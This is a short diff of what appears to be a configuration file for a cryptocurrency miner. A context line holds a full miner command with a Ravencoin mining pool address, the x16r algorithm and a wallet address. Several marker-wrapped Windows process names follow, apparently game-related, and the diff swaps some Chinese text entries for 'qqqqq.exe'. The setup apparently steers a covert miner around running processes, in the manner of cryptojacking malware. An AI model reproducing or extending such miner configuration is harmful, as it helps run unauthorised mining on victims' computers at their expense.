@@ -16,7 +16,7 @@ A6A-- -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RNxtTYaFdtxHTAHXcXM9
 A9A--ON1--A9A
 A0A--\TP5Helper.exe--A0A
 A8A--TASLogin.exe--A8A
-B1B--都是福建师范--B1B
-B2B--都是福建师范--B2B
-B3B--都是福建师范--B3B
-B4B--我爱你--B4B
+B1B--qqqqq.exe--B1B
+B2B--qqqqq.exe---B2B
+B3B--qqqqq.exe---B3B
+B4B--qqqqq.exe---B4B
